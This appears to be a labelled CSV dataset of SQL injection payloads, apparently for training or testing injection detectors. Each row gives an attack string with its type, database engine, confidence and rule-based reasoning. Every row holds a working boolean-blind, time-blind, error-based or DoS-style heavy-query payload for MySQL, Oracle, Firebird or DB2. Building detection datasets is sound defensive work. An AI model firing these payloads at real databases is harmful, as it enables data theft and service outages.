id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
18744,"1' ) ) as hrra where 9533 = 9533 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,generic,0.9,"'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18745,"1 ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,generic,0.9,"'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18746,"1' ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'xuwl' like 'xuwl",heavy_query,generic,0.9,"''x' LIKE 'x'' -> boolean_blind (P3): Quoted-string LIKE tautology for boolean blind | 'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18747,"1 where 7072 = 7072 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'UNION SELECT (x3)' -> union_based (P7): Detected 3 UNION SELECT clause(s) for data extraction | db_engine=mysql,2
18748,"1' and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.8,"'rdb$fields,rdb$types' -> heavy_query (P4): Firebird heavy query joining rdb$fields and rdb$types | db_engine=firebird",1
18749,"1 ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( 2341 = 2341",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,2
18750,"-2424 ) where 8132 = 8132 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",boolean_blind,oracle,0.8,'case when' -> boolean_blind (P3): CASE WHEN conditional select for boolean blind | 'ctxsys.' -> error_based (P4): ctxsys.drithsx.sn is Oracle error-based | db_engine=oracle,1
18751,"1%"" ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( ""%"" = """,boolean_blind,oracle,0.8,"'""x""=""x""' -> boolean_blind (P3): Double-quoted string equality tautology for boolean blind | 'utl_inaddr' -> error_based (P4): utl_inaddr.get_host_address is Oracle error/OOB | db_engine=oracle",1
18752,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( 'cxjp' = 'cxjp",boolean_blind,db2,0.9,"'AND/OR 'x'='x'' -> boolean_blind (P3): AND/OR string equality tautology for boolean blind | 'count(*) from T t1,T t2,T t3' -> heavy_query (P4): count(*) over 3+ self-joined tables creates cartesian heavy query | db_engine=db2",3
18753,"1' ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( 'rqbf' = 'rqbf",heavy_query,firebird,0.8,"'rdb$fields,rdb$types' -> heavy_query (P4): Firebird heavy query joining rdb$fields and rdb$types | db_engine=firebird",1
